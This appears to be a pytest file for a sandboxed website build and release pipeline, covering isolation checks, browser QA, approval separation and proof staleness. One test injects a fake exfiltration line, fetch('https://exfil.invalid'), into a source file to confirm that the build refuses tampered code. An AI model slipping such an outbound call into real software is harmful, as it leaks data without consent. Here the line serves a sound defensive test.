"""UCPO untrusted execution: sandboxed build, real-browser QA, durable job, release proof, approval, staleness.

The fail-closed path (no isolation) runs everywhere. Tests that need the sandbox and Chromium
skip with an explicit NOT_RUN reason when the host cannot provide them; they never fake a pass.
"""

from __future__ import annotations

import json
from pathlib import Path
from uuid import uuid4

import pytest

from services.langgraph.agency.durable.fsm import RunState
from services.langgraph.agency.foundry import psem
from services.langgraph.agency.ucpo import build as build_mod
from services.langgraph.agency.ucpo import service
from services.langgraph.agency.ucpo.contracts import WebsiteBrief
from services.langgraph.agency.ucpo.qa import verify_build
from services.langgraph.agency.ucpo.requirements import compile_requirements
from services.langgraph.agency.ucpo.sandbox import Isolation, probe_isolation
from services.langgraph.agency.ucpo.site import compile_site
from services.langgraph.agency.ucpo.source import SourceFile, SourceTreeManifest, generate_source, tree_hash
from services.langgraph.agency.project_os.storage import LocalStorageAdapter
from services.langgraph.persistence.projects import create_project_workspace
from services.langgraph.security.auth import Principal
from services.langgraph.tests._project_os_support import as_user, client, headers

ROOT = Path(__file__).resolve().parents[3]
SAMPLE = json.loads((ROOT / "sample_ucpo_website.json").read_text())
_ISO = None


def isolation() -> Isolation:
    global _ISO
    if _ISO is None:
        _ISO = probe_isolation()
    return _ISO


needs_sandbox = pytest.mark.skipif(not isolation().available,
                                   reason=f"NOT_RUN: sandbox unavailable on this host ({'; '.join(isolation().reasons)})")


@pytest.fixture
def root(tmp_path, monkeypatch):
    export = tmp_path / "exports"
    monkeypatch.setenv("AMC_EXPORT_ROOT", str(export))
    monkeypatch.setenv("AMC_OBJECT_STORAGE_BACKEND", "local")
    return export


def _project(root: Path):
    tenant, project = f"tenant-ucpo-{uuid4().hex[:8]}", f"prj-{uuid4().hex[:12]}"
    create_project_workspace(tenant_id=tenant, project_id=project, actor="alice", display_name="UCPO fixture",
                             slug=f"u-{project[-6:]}", export_root=root)
    return tenant, project, Principal(user_id="alice", tenant_id=tenant, role="admin", allowed_project_ids=frozenset({project}))


def test_without_isolation_source_is_generated_but_nothing_executes(root, monkeypatch):
    tenant, project, alice = _project(root)
    monkeypatch.setattr(build_mod, "probe_isolation", lambda: Isolation(False, ("fixture: no user namespaces",)))
    compiled = service.compile_site_line(alice, project, "halden", WebsiteBrief.model_validate(SAMPLE),
                                         adapter=LocalStorageAdapter(root), export_root=root)
    assert compiled["stages"]["source"]["action"] == "created" and compiled["compile_coverage"]["coverage"] < 1
    report = service.run_build_tick(compiled["job_id"])
    assert report.final_state == RunState.BLOCKED_ENVIRONMENT.value
    assert report.reasons and report.reasons[0].startswith("BLOCKED_ISOLATION")
    view = service.inspect_site(alice, project, "halden", adapter=LocalStorageAdapter(root))
    assert "build" not in view["stages"] and "release_proof" not in view["stages"]
    assert view["release"]["allowed"] is False and view["release"]["deployment"] == "NOT_AUTHORIZED"


def test_a_role_cannot_store_a_stage_outside_its_contract(root):
    from services.langgraph.agency.kernel.roles import RoleContractError

    tenant, project, alice = _project(root)
    with pytest.raises(RoleContractError):
        service._put(alice, project, "halden", "x", b"{}", adapter=LocalStorageAdapter(root),
                     spec=("copywriter", "release_record", "application/json"))


@needs_sandbox
def test_sandboxed_build_browser_qa_release_and_stale_after_change(root, monkeypatch):
    tenant, project, alice = _project(root)
    adapter = LocalStorageAdapter(root)
    brief = WebsiteBrief.model_validate(SAMPLE)
    compiled = service.compile_site_line(alice, project, "halden", brief, adapter=adapter, export_root=root)
    again = service.compile_site_line(alice, project, "halden", brief, adapter=adapter, export_root=root)
    assert again["job_id"] == compiled["job_id"]
    assert {s["action"] for s in again["stages"].values()} == {"reused_unchanged"}

    report = service.run_build_tick(compiled["job_id"])
    view = service.inspect_site(alice, project, "halden", adapter=adapter)
    assert report.final_state == RunState.WAITING_APPROVAL.value, (report.reasons, view["release"]["reasons"], [
        c for c in (view["browser_qa"] or {}).get("checks", []) if c["result"] != "PASS"][:5])
    assert view["build"]["status"] == "PASSED" and view["browser_qa"]["status"] == "PASSED"
    assert view["browser_qa"]["browser"]["name"] == "chromium" and not view["browser_qa"]["blocked_requests"]
    assert len(view["browser_qa"]["screenshots"]) == 9
    assert view["coverage"]["coverage"] == 1.0 and not view["coverage"]["debt"]
    assert view["proof"]["eligible_for_approval"] and view["proof"]["deployment"] == "NOT_AUTHORIZED"
    assert view["approval"]["status"] == "pending"
    assert view["release"]["allowed"] is False and "APPROVAL_PENDING" in view["release"]["reasons"]

    # The requester cannot approve their own release proof; a different approver can.
    approval_id = view["approval"]["approval_id"]
    as_user(monkeypatch, "alice", tenant=tenant, projects=project)
    assert client.post(f"/approvals/{approval_id}/decide", json={"decision": "approve"}, headers=headers()).status_code == 403
    as_user(monkeypatch, "bob", tenant=tenant, projects=project)
    decided = client.post(f"/approvals/{approval_id}/decide", json={"decision": "approve"}, headers=headers())
    assert decided.status_code == 200, decided.text
    approved = service.inspect_site(alice, project, "halden", adapter=adapter)
    assert approved["release"]["allowed"] is True and approved["release"]["deployment"] == "NOT_AUTHORIZED"

    # A copy edit regenerates selectively; the approved proof becomes stale and cannot be reused.
    pages = json.loads(json.dumps(SAMPLE["pages"]))
    pages[1]["sections"][0]["body"] = "Each firing produces about forty pieces."
    changed = service.compile_site_line(alice, project, "halden", WebsiteBrief.model_validate({**SAMPLE, "pages": pages}),
                                        adapter=adapter, export_root=root)
    assert changed["stages"]["brief"]["action"] == "revised" and changed["job_id"] != compiled["job_id"]
    assert changed["stages"]["image-plate-kiln"]["action"] in {"reused_unchanged", "reconfirmed"}
    stale = service.inspect_site(alice, project, "halden", adapter=adapter)
    assert stale["release"]["allowed"] is False
    assert any(r.startswith("PROOF_STALE") for r in stale["release"]["reasons"])
    old_job = service.run_build_tick(compiled["job_id"])
    assert old_job.outcome in {"NO_WORK", "BLOCKED_ENVIRONMENT"}  # the superseded job never builds again
    rebuilt = service.run_build_tick(changed["job_id"])
    assert rebuilt.final_state == RunState.WAITING_APPROVAL.value, rebuilt.reasons
    fresh = service.inspect_site(alice, project, "halden", adapter=adapter)
    assert fresh["approval"]["approval_id"] != approval_id and fresh["release"]["allowed"] is False
    L = service.linker(project, "halden", adapter=adapter)
    assert L.trace("req.works.s1.body")["rendered"]["/works/"] == ["Each firing produces about forty pieces."]


@needs_sandbox
def test_browser_qa_catches_a_defective_generator(tmp_path):
    brief = WebsiteBrief.model_validate(SAMPLE)
    pkg = compile_requirements(brief, project_ref="p")
    genome = psem.compile_psem_genome(psem.psem_brief(brief.organization, seed=brief.seed), project_id="p")
    _, css, sh = psem.compile_psem_tokens(genome)
    arch, ir = compile_site(brief, pkg, genome, token_refs={"dtcg_source_hash": sh})
    files, _ = generate_source(ir, genome, css)
    # Simulate a defective template: accent labels on paper, the skip link gone, a fixed-width block.
    files["app/globals.css"] += (b"\n.sec--paper .sec__label { color: var(--amc-color-accent); }\n"
                                 b".sec__body { min-width: 900px; }\n")
    files["components/SiteHeader.tsx"] = files["components/SiteHeader.tsx"].replace(
        b'<a className="skip" href="#main">Skip to content</a>\n', b"")
    entries = tuple(SourceFile(path=p, sha256=__import__("hashlib").sha256(b).hexdigest(), bytes=len(b), role="config")
                    for p, b in sorted(files.items()))
    manifest = SourceTreeManifest(website_ir_ref=ir.content_hash, files=entries, dependencies={
        **service.DEPENDENCIES, **service.DEV_DEPENDENCIES}, tree_hash=tree_hash(entries))
    routes = [p.route for p in ir.pages]
    result, out = build_mod.build_site(files, manifest, routes=routes, keep_output=True, isolation=isolation())
    try:
        assert result.status == "PASSED", result.steps
        v = verify_build(out, routes=routes, expected_output_hash=result.output_hash, isolation=isolation())
    finally:
        build_mod.cleanup(out.parent.parent)
    failed = {c.check for c in v.checks if c.result == "FAIL"}
    assert v.status == "FAILED", [c.detail for c in v.checks if c.result == "BLOCKED"]
    assert {"psem_colours", "keyboard_focus", "reflow"} <= failed
    assert any(c.check == "reflow" and c.viewport == "320x900" and c.result == "FAIL" for c in v.checks)


@needs_sandbox
def test_build_refuses_tampered_source_before_running_anything():
    brief = WebsiteBrief.model_validate(SAMPLE)
    pkg = compile_requirements(brief, project_ref="p")
    genome = psem.compile_psem_genome(psem.psem_brief(brief.organization, seed=brief.seed), project_id="p")
    _, css, sh = psem.compile_psem_tokens(genome)
    _, ir = compile_site(brief, pkg, genome, token_refs={"dtcg_source_hash": sh})
    files, manifest = generate_source(ir, genome, css)
    files["components/Section.tsx"] += b"\nfetch('https://exfil.invalid')\n"
    result, out = build_mod.build_site(files, manifest, routes=["/"], isolation=isolation())
    assert result.status == "FAILED" and out is None
    assert [s["name"] for s in result.steps] == ["source_policy"]
